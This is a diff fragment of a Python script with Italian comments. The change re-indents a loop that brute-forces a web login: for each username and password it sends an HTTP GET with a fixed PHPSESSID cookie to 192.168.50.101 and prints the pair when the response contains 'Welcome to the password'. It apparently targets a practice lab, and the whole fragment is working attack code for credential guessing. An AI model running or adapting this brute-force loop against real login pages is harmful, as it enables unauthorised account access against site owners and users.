@@ -42,26 +42,26 @@ for user in user_list:
 		
 #Viene creato un dizionario headers contenente gli header necessari per la richiesta HTTP GET. In particolare, c'è un header Cookie con un valore di sessione PHPSESSID	
 
-headers = {"content-type": "application/x-www-form-urlencoded","accept": "text/html,application/xhtml+xml",'Cookie':f'PHPSESSID={"8d34670d4eaac7675169b4d8d7c2e19e"}'}
+		headers = {"content-type": "application/x-www-form-urlencoded","accept": "text/html,application/xhtml+xml",'Cookie':f'PHPSESSID={"8d34670d4eaac7675169b4d8d7c2e19e"}'}
 		
 #Crea una connessione HTTP (HTTPConnection) al server target con l'indirizzo IP '192.168.50.101' sulla porta 80
 
-conn = http.client.HTTPConnection('192.168.50.101',80)
+		conn = http.client.HTTPConnection('192.168.50.101',80)
 
 #Invia una richiesta HTTP GET all'URL finale (urlf) con i parametri e gli header specificati
 
-conn.request("GET",urlf,"" ,headers)
+		conn.request("GET",urlf,"" ,headers)
 
 #Riceve la risposta dal server
 
-response = conn.getresponse()
+		response = conn.getresponse()
 
 #Legge la risposta del server e la decodifica
 
-data = response.read().decode()
+		data = response.read().decode()
 
 #Se la stringa "Welcome to the password" è presente nella risposta, stampa un messaggio che indica che l'accesso è stato effettuato con successo utilizzando la coppia di credenziali corrente
 
-if "Welcome to the password" in str(data):
+		if "Welcome to the password" in str(data):
 
-print("logged with", user,"-",pwd)
+			print("logged with", user,"-",pwd)
